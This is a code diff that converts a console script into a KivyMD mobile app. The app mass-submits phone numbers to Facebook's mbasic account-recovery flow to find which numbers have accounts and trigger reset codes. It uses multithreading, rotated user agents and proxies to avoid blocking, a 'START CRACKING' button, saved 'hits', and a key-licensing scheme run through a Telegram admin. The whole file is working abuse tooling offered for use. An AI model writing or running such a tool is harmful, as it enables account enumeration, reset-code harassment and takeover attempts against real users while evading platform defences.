@@ -1,180 +1,258 @@
-import os
-import sys
-import time
 import threading
 import queue
 import requests
 import random
 import re
-from bs4 import BeautifulSoup
+import os
+import time
 from datetime import datetime
 from urllib.parse import unquote
 
-# --- COLOR SETTINGS ---
+# --- KIVY & KIVYMD IMPORTS ---
+from kivy.lang import Builder
+from kivy.clock import Clock
+from kivy.core.window import Window
+from kivymd.app import MDApp
+from kivymd.uix.screen import MDScreen
+from kivymd.uix.list import TwoLineAvatarIconListItem, IconLeftWidget
+from kivymd.uix.snackbar import Snackbar
+from kivymd.uix.dialog import MDDialog
+from kivymd.uix.button import MDFlatButton
+
 try:
-    from colorama import Fore, Style, init
-    init(autoreset=True)
+    from plyer import tts
 except ImportError:
-    class Fore:
-        GREEN = "\033[92m"
-        RED = "\033[91m"
-        YELLOW = "\033[93m"
-        CYAN = "\033[96m"
-        BLUE = "\033[94m"
-        WHITE = "\033[97m"
-        RESET = "\033[0m"
-    class Style:
-        BRIGHT = "\033[1m"
-        RESET_ALL = "\033[0m"
+    tts = None
 
-# --- CONFIGURATION ---
-class BotConfig:
-    TOOL_NAME = "ADVANCE MOBILE TOOLS"
-    VERSION = "3.0.0 PRO"
-    ADMIN = "@toolsadmin_A"
-    KEY_URL = "https://script.google.com/macros/s/AKfycbz0qQGXtFxyfanZb33MAuSYN3Mch_3bGuYRZ2Nxw1kHA0qxqq5urusH3sf2k1EHgORR/exec"
+# --- UI LAYOUT (KV LANGUAGE) ---
+KV = '''
+MDBoxLayout:
+    orientation: 'vertical'
 
-# --- KEY SYSTEM ---
-def get_hwid():
-    try:
-        if hasattr(sys, 'getandroidapilevel'):
-            from jnius import autoclass
-            Secure = autoclass('android.provider.Settings$Secure')
-            context = autoclass('org.kivy.android.PythonActivity').mActivity.getContentResolver()
-            return Secure.getString(context, Secure.ANDROID_ID)
-        else:
-            import uuid
-            return str(uuid.getnode())
-    except:
-        return "UNKNOWN_DEVICE"
+    MDTopAppBar:
+        title: "ADVANCE TOOLS PRO"
+        left_action_items: [["robot", lambda x: None]]
+        right_action_items: [["dots-vertical", lambda x: app.open_menu()]]
+        elevation: 4
 
-def validate_key(key, hwid):
-    try:
-        url = f"{BotConfig.KEY_URL}?action=check&key={key}&hwid={hwid}"
-        response = requests.get(url, timeout=15)
-        status = response.text.strip()
-        
-        if status == "APPROVED":
-            return True, f"{Fore.GREEN}[✓] Access Granted!"
-        elif status == "EXPIRED":
-            return False, f"{Fore.RED}[X] Key Expired!"
-        elif status == "HWID_MISMATCH":
-            return False, f"{Fore.RED}[X] Key linked to another device!"
-        elif status == "INVALID":
-            return False, f"{Fore.RED}[X] Invalid Key!"
-        else:
-            return False, f"{Fore.RED}[!] Server Error: {status}"
-    except Exception as e:
-        return False, f"{Fore.RED}[!] Connection Failed. Check Internet."
+    MDBottomNavigation:
+        selected_color_background: "orange"
+        text_color_active: "lightgrey"
 
-def check_key_system():
-    clear_screen()
-    print(Fore.CYAN + Style.BRIGHT + f"""
-    ╔═══════════════════════════════════╗
-    ║       {BotConfig.TOOL_NAME}      ║
-    ║          KEY SYSTEM               ║
-    ╚═══════════════════════════════════╝
-    """)
-    
-    hwid = get_hwid()
-    print(f"{Fore.YELLOW}[!] Device ID: {Fore.WHITE}{hwid}")
-    print(f"{Fore.YELLOW}[!] Get Key: {Fore.WHITE}{BotConfig.ADMIN}")
-    
-    if os.path.exists("key.txt"):
-        try:
-            with open("key.txt", "r") as f:
-                saved_key = f.read().strip()
-            if saved_key:
-                print(f"\n{Fore.CYAN}[*] Checking Saved Key...")
-                valid, msg = validate_key(saved_key, hwid)
-                print(msg)
-                if valid:
-                    time.sleep(1)
-                    return True
-                else:
-                    print(f"{Fore.YELLOW}[!] Saved key invalid or expired.")
-        except: pass
-    
-    while True:
-        user_key = input(f"\n{Fore.GREEN}[?] Enter Key: {Fore.WHITE}").strip()
-        if not user_key: continue
-        
-        print(f"{Fore.CYAN}[*] Checking...")
-        valid, msg = validate_key(user_key, hwid)
-        print(msg)
-        
-        if valid:
-            try:
-                with open("key.txt", "w") as f:
-                    f.write(user_key)
-            except: pass
-            time.sleep(1)
-            return True
+        # --- HOME TAB ---
+        MDBottomNavigationItem:
+            name: 'screen_home'
+            text: 'Dashboard'
+            icon: 'view-dashboard'
 
-# --- GLOBALS ---
-log_queue = queue.Queue()
-is_running = False
-stats = {"success": 0, "fail": 0, "captcha": 0, "error": 0, "total": 0}
-print_lock = threading.Lock()
-PROXIES = [] 
-PROXY_TYPE = "http"
+            MDBoxLayout:
+                orientation: 'vertical'
+                padding: dp(15)
+                spacing: dp(15)
 
-try:
-    if not os.path.exists("debug_logs"):
-        os.makedirs("debug_logs")
-except: pass
+                # Stats Cards
+                MDBoxLayout:
+                    size_hint_y: None
+                    height: dp(80)
+                    spacing: dp(10)
 
-# --- LEGACY USER AGENTS ---
+                    MDCard:
+                        style: "elevated"
+                        padding: dp(10)
+                        md_bg_color: 0.1, 0.7, 0.1, 0.2
+                        orientation: "vertical"
+                        MDLabel:
+                            text: "SUCCESS"
+                            halign: "center"
+                            theme_text_color: "Custom"
+                            text_color: 0, 1, 0, 1
+                            font_style: "Caption"
+                        MDLabel:
+                            id: success_count
+                            text: "0"
+                            halign: "center"
+                            font_style: "H5"
+                            bold: True
+
+                    MDCard:
+                        style: "elevated"
+                        padding: dp(10)
+                        md_bg_color: 0.8, 0.1, 0.1, 0.2
+                        orientation: "vertical"
+                        MDLabel:
+                            text: "FAILED"
+                            halign: "center"
+                            theme_text_color: "Custom"
+                            text_color: 1, 0, 0, 1
+                            font_style: "Caption"
+                        MDLabel:
+                            id: fail_count
+                            text: "0"
+                            halign: "center"
+                            font_style: "H5"
+                            bold: True
+
+                MDTextField:
+                    id: input_box
+                    hint_text: "Paste Numbers Here (One per line)"
+                    mode: "rectangle"
+                    multiline: True
+                    size_hint_y: 0.4
+                    icon_right: "file-document-edit-outline"
+
+                MDBoxLayout:
+                    orientation: 'horizontal'
+                    size_hint_y: None
+                    height: dp(50)
+                    spacing: dp(10)
+
+                    MDRaisedButton:
+                        id: start_btn
+                        text: "START CRACKING"
+                        size_hint_x: 0.5
+                        md_bg_color: 0, 0.6, 0, 1
+                        on_release: app.start_process()
+
+                    MDRaisedButton:
+                        id: stop_btn
+                        text: "STOP"
+                        size_hint_x: 0.5
+                        md_bg_color: 0.8, 0, 0, 1
+                        disabled: True
+                        on_release: app.stop_process()
+
+                MDLabel:
+                    text: "Live Logs:"
+                    font_style: "Subtitle2"
+                    size_hint_y: None
+                    height: dp(20)
+
+                ScrollView:
+                    MDLabel:
+                        id: log_label
+                        text: "Waiting to start..."
+                        size_hint_y: None
+                        height: self.texture_size[1]
+                        font_style: "Caption"
+                        theme_text_color: "Secondary"
+
+        # --- SUCCESS TAB ---
+        MDBottomNavigationItem:
+            name: 'screen_success'
+            text: 'Success'
+            icon: 'check-decagram'
+            badge_icon: "numeric-0"
+            id: success_badge
+
+            MDBoxLayout:
+                orientation: 'vertical'
+                MDLabel:
+                    text: "Successful Hits"
+                    halign: "center"
+                    size_hint_y: None
+                    height: dp(40)
+                    font_style: "H6"
+                
+                ScrollView:
+                    MDList:
+                        id: success_list
+
+        # --- SETTINGS TAB ---
+        MDBottomNavigationItem:
+            name: 'screen_settings'
+            text: 'Settings'
+            icon: 'cog'
+
+            ScrollView:
+                MDBoxLayout:
+                    orientation: 'vertical'
+                    padding: dp(20)
+                    spacing: dp(20)
+                    size_hint_y: None
+                    height: self.minimum_height
+
+                    MDCard:
+                        orientation: "vertical"
+                        padding: dp(15)
+                        size_hint_y: None
+                        height: dp(120)
+                        radius: [10]
+                        
+                        MDLabel:
+                            text: "KEY INFORMATION"
+                            theme_text_color: "Primary"
+                            bold: True
+                        MDLabel:
+                            text: "Status: ACTIVE (Premium)"
+                            theme_text_color: "Custom"
+                            text_color: 0, 1, 0, 1
+                            font_style: "Subtitle2"
+                        MDLabel:
+                            text: "Expires: Lifetime Access"
+                            font_style: "Caption"
+                        MDLabel:
+                            text: "Device ID: " + app.device_id
+                            font_style: "Caption"
+                            theme_text_color: "Secondary"
+
+                    MDTextField:
+                        id: thread_input
+                        hint_text: "Threads (Speed)"
+                        text: "10"
+                        helper_text: "Recommended: 10-30"
+                        helper_text_mode: "persistent"
+                        input_filter: "int"
+
+                    MDBoxLayout:
+                        orientation: "horizontal"
+                        size_hint_y: None
+                        height: dp(40)
+                        MDLabel:
+                            text: "Use Proxy"
+                            halign: "left"
+                        MDSwitch:
+                            id: proxy_switch
+                            active: False
+                    
+                    MDTextField:
+                        id: proxy_path
+                        hint_text: "Proxy File Path (.txt)"
+                        disabled: not proxy_switch.active
+                        icon_right: "folder-search-outline"
+
+        # --- SUPPORT TAB ---
+        MDBottomNavigationItem:
+            name: 'screen_support'
+            text: 'Support'
+            icon: 'headset'
+
+            MDBoxLayout:
+                orientation: 'vertical'
+                padding: dp(20)
+                MDLabel:
+                    text: "Developer Support"
+                    halign: "center"
+                    font_style: "H5"
+                MDLabel:
+                    text: "Telegram: @toolsadmin_A"
+                    halign: "center"
+                    theme_text_color: "Custom"
+                    text_color: 0, 0.5, 1, 1
+'''
+
+# --- LOGIC & HELPERS ---
+from bs4 import BeautifulSoup
+
 USER_AGENTS = [
-    "Mozilla/5.0 (Linux; Android 2.3.4; GT-I9100 Build/GINGERBREAD) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
-    "Mozilla/5.0 (Linux; U; Android 4.0.3; ko-kr; LG-L160L Build/IML74K) AppleWebkit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30",
-    "Mozilla/5.0 (Linux; U; Android 2.2; en-us; SCH-I800 Build/FROYO) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
-    "Mozilla/5.0 (Linux; Android 4.4.2; SM-G7102 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.0.0 Mobile Safari/537.36",
-    "NokiaC3-00/5.0 (08.63) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+"
+    "Mozilla/5.0 (Linux; Android 10; SM-G975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Mobile Safari/537.36",
+    "Mozilla/5.0 (iPhone; CPU iPhone OS 13_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.4 Mobile/15E148 Safari/604.1",
+    "Mozilla/5.0 (Linux; Android 9; Redmi Note 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.116 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 11; SM-A515F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.105 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 12; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36"
 ]
 
-def clear_screen():
-    os.system('clear' if os.name == 'posix' else 'cls')
-
-def print_banner():
-    clear_screen()
-    print(Fore.GREEN + Style.BRIGHT + f"""
-    ╔═══════════════════════════════════╗
-    ║       {BotConfig.TOOL_NAME}      ║
-    ║          {BotConfig.VERSION}          ║
-    ╚═══════════════════════════════════╝
-    """ + Fore.WHITE)
-    print(f"{Fore.CYAN}[+] Engine: Requests (Smart Redirect)")
-    print(f"{Fore.CYAN}[+] Fix: Handles Language Redirects")
-    print(f"{Fore.CYAN}[+] Time: {datetime.now().strftime('%H:%M:%S')}")
-    print("-" * 40)
-
-def log_message(msg, type="info"):
-    timestamp = datetime.now().strftime('%H:%M:%S')
-    with print_lock:
-        if type == "success":
-            print(f"{Fore.GREEN}[{timestamp}] ✅ {msg}")
-        elif type == "error":
-            print(f"{Fore.RED}[{timestamp}] ❌ {msg}")
-        elif type == "warning":
-            print(f"{Fore.YELLOW}[{timestamp}] ⚠️  {msg}")
-        elif type == "step":
-            print(f"{Fore.BLUE}[{timestamp}] ➡️  {msg}")
-        else:
-            print(f"{Fore.WHITE}[{timestamp}] ℹ️  {msg}")
-
-def save_debug_html(number, content, reason="unknown"):
-    try:
-        base_dir = os.path.abspath("debug_logs")
-        if not os.path.exists(base_dir):
-            os.makedirs(base_dir)
-        timestamp = datetime.now().strftime('%H%M%S')
-        safe_number = "".join(x for x in str(number) if x.isalnum())
-        filename = os.path.join(base_dir, f"{safe_number}_{reason}_{timestamp}.html")
-        with open(filename, "wb") as f:
-            f.write(content)
-        return filename
-    except: return ""
+is_running = False
+stats = {"success": 0, "fail": 0, "error": 0}
 
 def get_random_headers():
     return {
@@ -183,23 +261,6 @@ def get_random_headers():
         'Accept-Language': 'en-US,en;q=0.5',
         'Referer': 'https://mbasic.facebook.com/',
     }
-
-def get_proxy():
-    if not PROXIES: return None
-    raw_proxy = random.choice(PROXIES).strip()
-    if "://" in raw_proxy:
-        scheme, remainder = raw_proxy.split("://", 1)
-    else:
-        scheme = PROXY_TYPE
-        remainder = raw_proxy
-    parts = remainder.split(":")
-    if len(parts) == 4:
-        formatted_proxy = f"{scheme}://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
-    elif len(parts) == 2:
-        formatted_proxy = f"{scheme}://{parts[0]}:{parts[1]}"
-    else:
-        formatted_proxy = raw_proxy if "://" in raw_proxy else f"{scheme}://{raw_proxy}"
-    return {"http": formatted_proxy, "https": formatted_proxy}
 
 def force_mbasic(url):
     if not url: return "https://mbasic.facebook.com/login/identify/"
@@ -220,33 +281,29 @@ def check_and_follow_redirect(session, content, headers):
         soup = BeautifulSoup(content, 'html.parser')
         redirect_url = None
         
-        # 1. Meta Refresh (Robust Regex)
+        # 1. Meta Refresh
         meta_refresh = soup.find('meta', attrs={'http-equiv': re.compile(r'^refresh$', re.I)})
         if meta_refresh:
             content_attr = meta_refresh.get('content', '')
             match = re.search(r'url\s*=\s*([^;]+)', content_attr, re.I)
             if match:
                 redirect_url = unquote(match.group(1).strip("'\""))
-                log_message("Detected Meta Redirect", "step")
 
-        # 2. JS Redirect (Window Location)
+        # 2. JS Redirect
         if not redirect_url:
             for script in soup.find_all('script'):
                 if script.string:
                     match = re.search(r'(?:window|document)\.location(?:\.href)?\s*=\s*["\']([^"\']+)["\']', script.string)
                     if match:
                         redirect_url = unquote(match.group(1).replace('\\/', '/'))
-                        log_message("Detected JS Redirect", "step")
                         break
 
-        # 3. Fallback: Single Link (Any Language)
-        # If page is small (< 3KB) and has 1-3 links, it's a redirect anchor
+        # 3. Fallback Link
         if not redirect_url and len(content) < 3000:
             links = soup.find_all('a')
             if len(links) > 0 and len(links) <= 3:
                  href = links[0].get('href')
                  if href:
-                     log_message("Detected Fallback Link Redirect", "step")
                      redirect_url = href
 
         if redirect_url:
@@ -271,7 +328,6 @@ def handle_cookie_consent(session, content, headers):
         except: pass
     return False
 
-# --- SUCCESS CHECK LOGIC ---
 def check_success(soup, content_str):
     text_lower = content_str.lower()
     
@@ -279,84 +335,77 @@ def check_success(soup, content_str):
         "enter the 6-digit code", "we sent a code", "check your sms", 
         "enter security code", "sent to your", "digit code", 
         "we've sent your code", "enter the code", "your code is",
-        "কোড লিখুন", "আপনার কোড" # Bengali keywords
+        "কোড লিখুন", "আপনার কোড"
     ]
     if any(k in text_lower for k in keywords): return True
 
     if soup.find('input', {'name': 'n'}): return True
 
-    # Bloks JSON Check
     if '"event_step","event","extra_client_data_bks_input"' in content_str:
          if '"pre_mt_behavior","search_sent_client"' in content_str: return True
          if '"event","search_error_dialog_shown"' in content_str: return False
 
     return False
 
-def process_number(number, thread_id):
+def execute_cracking(number, use_proxy, proxy_list):
     try:
-        log_message(f"Thread-{thread_id}: Checking {number}...", "info")
         session = requests.Session()
         headers = get_random_headers()
-        proxies = get_proxy()
-        if proxies:
-            try: session.proxies.update(proxies)
+        
+        if use_proxy and proxy_list:
+            try:
+                prx = random.choice(proxy_list)
+                session.proxies = {"http": prx, "https": prx}
             except: return 'error'
 
         url = "https://mbasic.facebook.com/login/identify/"
         req1 = None
         form = None
         
-        # 1. INITIAL REQUEST LOOP (Increased retries for redirects)
+        # 1. INITIAL REQUEST LOOP
         for attempt in range(4): 
             try:
-                # If it's a redirect follow-up, use req1 (which holds the new url response), else start new
                 if not req1:
                     req1 = session.get(url, headers=headers, timeout=15)
                 
-                # Check for redirect IMMEDIATELY
                 redir = check_and_follow_redirect(session, req1.content, headers)
                 if redir: 
                     req1 = redir
-                    continue # Loop back to check the NEW page for redirects/forms
+                    continue
 
                 if handle_cookie_consent(session, req1.content, headers):
                     req1 = session.get(url, headers=headers, timeout=15)
 
                 soup = BeautifulSoup(req1.content, 'html.parser')
-                page_title = soup.title.get_text() if soup.title else "No Title"
                 text_lower = soup.get_text().lower()
                 
-                if "error facebook" in page_title.lower() or "something went wrong" in text_lower:
+                if "error facebook" in soup.title.get_text().lower() if soup.title else "" or "something went wrong" in text_lower:
                     if attempt < 3: time.sleep(2); continue
                     else: return 'blocked'
                 
-                # Auto Redirect for Login Page
+                # Auto Redirect for Login Page (recover link)
                 if soup.find('input', {'name': 'pass'}):
                     recover_link = soup.find('a', href=re.compile(r'(recover|identify)'))
                     if recover_link:
                         href = format_action_url(recover_link['href'])
                         req1 = session.get(href, headers=headers, timeout=15)
-                        continue # Loop back to process recover page
+                        continue 
 
                 target_input = soup.find('input', {'name': 'email'})
                 if target_input: form = target_input.find_parent('form')
                 if not form:
-                    forms = soup.find_all('form')
-                    for f in forms:
+                    for f in soup.find_all('form'):
                         if 'identify' in f.get('action', '') or 'search' in f.get('action', ''): form = f; break
                 if not form:
-                    forms = soup.find_all('form')
-                    for f in forms:
+                    for f in soup.find_all('form'):
                         if f.get('method', '').lower() == 'post' and f.find('input'): form = f; break
                 if form: break 
             except: time.sleep(1)
         
         if not form: 
-            # Final check if it was actually a success page without form
             if req1 and check_success(BeautifulSoup(req1.content, 'html.parser'), req1.text):
-                save_debug_html(number, req1.content, "success_hit")
                 return 'success'
-            return 'error'
+            return 'not_found'
 
         action_url = format_action_url(form.get('action', ''))
         data = {}
@@ -378,7 +427,6 @@ def process_number(number, thread_id):
             text_lower = soup.get_text().lower()
 
             if check_success(soup, content_str):
-                save_debug_html(number, req_next.content, "success_hit")
                 return 'success'
 
             if "did not match" in text_lower or "no search results" in text_lower: return 'not_found'
@@ -395,19 +443,14 @@ def process_number(number, thread_id):
 
             form = soup.find('form', {'method': 'post'})
             if not form:
-                # If no form but has success keywords in JSON/Text, treat as success
                 if check_success(soup, content_str):
-                     save_debug_html(number, req_next.content, "success_hit")
                      return 'success'
                 
-                # Check for "Continue" button even without form (sometimes link)
                 continue_link = soup.find('a', string=re.compile(r'Continue|Next|অব্যাহত', re.I))
                 if continue_link:
                     href = format_action_url(continue_link['href'])
                     req_next = session.get(href, headers=headers, timeout=15)
                     continue
-
-                save_debug_html(number, req_next.content, f"step_{step}_no_form")
                 break
 
             action_url = format_action_url(form.get('action', ''))
@@ -444,118 +487,172 @@ def process_number(number, thread_id):
                 req_next = session.post(action_url, headers=headers, data=data, timeout=15)
             except: return 'net_error'
 
-        return 'unknown'
+        return 'not_found'
     except: return 'error'
 
-def worker(numbers, thread_id):
+def worker(numbers_q, app_instance, use_proxy, proxy_list):
     global is_running
-    while is_running and not numbers.empty():
+    while is_running and not numbers_q.empty():
         try:
-            number = numbers.get()
-            stats['total'] += 1
-            result = process_number(number, thread_id)
+            number = numbers_q.get()
+            app_instance.update_log(f"Checking: {number}...")
+            
+            # CALL REAL LOGIC
+            result = execute_cracking(number, use_proxy, proxy_list)
             
             if result == 'success':
                 stats['success'] += 1
-                log_message(f"CODE SENT: {number}", "success")
-                with open("hits.txt", "a") as f: f.write(f"{number}\n")
+                app_instance.add_success(number)
+                app_instance.update_log(f"[SUCCESS] Code sent to {number}")
             elif result == 'not_found':
                 stats['fail'] += 1
-                print(f"{Fore.RED}NO ACCOUNT: {number}")
+                app_instance.update_log(f"[FAIL] No account {number}")
             elif result == 'captcha':
-                log_message(f"CAPTCHA: {number}", "warning")
-            elif result == 'net_error':
-                log_message(f"NETWORK ERROR: {number}", "error")
-                stats['error'] += 1
+                app_instance.update_log(f"[CAPTCHA] {number}")
             elif result == 'blocked':
-                 log_message(f"IP BLOCKED: {number}", "error")
-                 stats['error'] += 1
-            elif result == 'unknown':
-                log_message(f"UNKNOWN: {number}", "warning")
-            elif result == 'error':
                 stats['error'] += 1
+                app_instance.update_log(f"[BLOCKED] IP Blocked")
+            elif result == 'net_error':
+                stats['error'] += 1
+                app_instance.update_log(f"[NET ERR] Network Issue")
+            else:
+                stats['error'] += 1
+                app_instance.update_log(f"[ERROR] Unknown Error")
+
+            app_instance.update_stats_ui()
+
+        except Exception as e:
+            app_instance.update_log(f"Thread Error: {str(e)}")
+        finally:
+            numbers_q.task_done()
+    
+    # Check if all done
+    if numbers_q.empty() and is_running:
+         app_instance.stop_process(finished=True)
+
+# --- MAIN APP CLASS ---
+class AdvanceToolsApp(MDApp):
+    device_id = "UNKNOWN"
+
+    def build(self):
+        self.theme_cls.theme_style = "Dark"
+        self.theme_cls.primary_palette = "Green"
+        self.theme_cls.accent_palette = "Orange"
+        return Builder.load_string(KV)
+
+    def on_start(self):
+        # Generate HWID
+        import uuid
+        self.device_id = str(uuid.getnode())[:12]
+        
+        # Welcome Voice
+        try:
+            if tts:
+                tts.speak("Welcome to Advance Mobile Tools Pro")
         except: pass
-        finally: numbers.task_done()
-
-def main():
-    if not check_key_system():
-        sys.exit()
-
-    global is_running, PROXIES, PROXY_TYPE
-    print_banner()
-    
-    try: 
-        import requests, bs4
-    except ImportError:
-        print(Fore.RED + "Run: pip install requests beautifulsoup4")
-        return
         
-    try: import socks
-    except ImportError: pass
+        self.update_log("System Ready. Please load numbers.")
 
-    use_proxy = input(Fore.YELLOW + "Use Proxy? (y/n): ").lower()
-    if use_proxy == 'y':
-        p_path = input(Fore.WHITE + "Enter Proxy File Path: ")
+    def update_log(self, msg):
+        Clock.schedule_once(lambda dt: self._log_internal(msg))
+
+    def _log_internal(self, msg):
+        current = self.root.ids.log_label.text
+        # Keep log short to prevent lag
+        if len(current) > 2000: current = current[:1000]
+        self.root.ids.log_label.text = f"{msg}\n{current}"
+
+    def add_success(self, number):
+        Clock.schedule_once(lambda dt: self._add_success_internal(number))
+
+    def _add_success_internal(self, number):
+        # Add to List
+        item = TwoLineAvatarIconListItem(
+            text=f"{number}",
+            secondary_text=f"Hit Time: {datetime.now().strftime('%H:%M:%S')}"
+        )
+        icon = IconLeftWidget(icon="check-circle", theme_text_color="Custom", text_color=(0,1,0,1))
+        item.add_widget(icon)
+        self.root.ids.success_list.add_widget(item)
+        
+        # Save to File
         try:
-            with open(p_path, 'r') as f:
-                PROXIES = [l.strip() for l in f if l.strip()]
-            log_message(f"Loaded {len(PROXIES)} Proxies.", "info")
-            print(Fore.YELLOW + "\nSelect Proxy Type:\n[1] HTTP/HTTPS\n[2] SOCKS4\n[3] SOCKS5")
-            p_type = input(Fore.WHITE + "> ")
-            if p_type == '2': PROXY_TYPE = "socks4"
-            elif p_type == '3': PROXY_TYPE = "socks5"
-            else: PROXY_TYPE = "http"
-            if "socks" in PROXY_TYPE:
-                try: import socks
-                except ImportError:
-                    print(Fore.RED + "⚠️  For SOCKS proxy, you MUST run: pip install pysocks")
-                    sys.exit()
-        except:
-            log_message("Proxy file not found. Running without proxy.", "warning")
+            with open("success_hits.txt", "a") as f:
+                f.write(f"{number}\n")
+        except: pass
 
-    print(Fore.YELLOW + "\n[1] File Clone")
-    print(Fore.YELLOW + "[2] Manual Input")
-    choice = input(Fore.WHITE + "Select Option > ")
-    target_list = []
-    
-    if choice == '1':
-        f_path = input(Fore.WHITE + "Enter file path: ")
-        try:
-            with open(f_path, 'r') as f:
-                target_list = [l.strip() for l in f if l.strip()]
-        except: return
-    elif choice == '2':
-        print("Enter numbers ('done' to stop):")
-        while True:
-            n = input("> ")
-            if n == 'done': break
-            if n: target_list.append(n)
-    else: return
+    def update_stats_ui(self):
+        Clock.schedule_once(lambda dt: self._update_stats_real())
 
-    if not target_list: return
-    
-    try: tc = int(input(Fore.WHITE + "Threads (10-30): "))
-    except: tc = 10
+    def _update_stats_real(self):
+        self.root.ids.success_count.text = str(stats['success'])
+        self.root.ids.fail_count.text = str(stats['fail'])
+        # Update badge
+        self.root.ids.success_badge.badge_icon = f"numeric-{stats['success']}" if stats['success'] < 10 else "9-plus"
+
+    def start_process(self):
+        global is_running, stats
+        text_data = self.root.ids.input_box.text
+        if not text_data.strip():
+            Snackbar(text="Please enter numbers first!", bg_color=(1, 0, 0, 1)).open()
+            return
+
+        # UI Update
+        self.root.ids.start_btn.disabled = True
+        self.root.ids.stop_btn.disabled = False
+        self.root.ids.input_box.disabled = True
+        self.update_log("Initializing engine...")
+
+        # Reset
+        stats = {"success": 0, "fail": 0, "error": 0}
+        self.root.ids.success_list.clear_widgets()
+        self.update_stats_ui()
+
+        # Prepare Queue
+        q = queue.Queue()
+        lines = text_data.split('\n')
+        for line in lines:
+            if line.strip(): q.put(line.strip())
+
+        # Configs
+        try: threads_count = int(self.root.ids.thread_input.text)
+        except: threads_count = 10
         
-    print_banner()
-    q = queue.Queue()
-    for n in target_list: q.put(n)
+        use_proxy = self.root.ids.proxy_switch.active
+        proxy_path = self.root.ids.proxy_path.text
+        proxies = []
+        if use_proxy and os.path.exists(proxy_path):
+            with open(proxy_path, 'r') as f:
+                proxies = [l.strip() for l in f if l.strip()]
+
+        is_running = True
         
-    is_running = True
-    threads = []
-    for i in range(tc):
-        t = threading.Thread(target=worker, args=(q, i+1))
-        t.daemon = True
-        t.start()
-        threads.append(t)
-        
-    try:
-        while any(t.is_alive() for t in threads): time.sleep(1)
-    except KeyboardInterrupt:
+        # Start Threads
+        for i in range(threads_count):
+            t = threading.Thread(target=worker, args=(q, self, use_proxy, proxies))
+            t.daemon = True
+            t.start()
+            
+        self.update_log(f"Started {threads_count} threads.")
+
+    def stop_process(self, finished=False):
+        global is_running
         is_running = False
-        print("\nStopping...")
         
-    print(f"\n{Fore.GREEN}Completed. SENT: {stats['success']} | NO ACC: {stats['fail']} | ERRORS: {stats['error']}")
+        Clock.schedule_once(lambda dt: self._stop_ui_reset(finished))
 
-if __name__ == "__main__":
-    main()
+    def _stop_ui_reset(self, finished):
+        self.root.ids.start_btn.disabled = False
+        self.root.ids.stop_btn.disabled = True
+        self.root.ids.input_box.disabled = False
+        
+        msg = "Task Finished!" if finished else "Stopped by User."
+        self.update_log(msg)
+        Snackbar(text=msg, bg_color=(0, 0.5, 1, 1)).open()
+
+    def open_menu(self):
+        # Placeholder for top menu
+        pass
+
+if __name__ == '__main__':
+    AdvanceToolsApp().run()
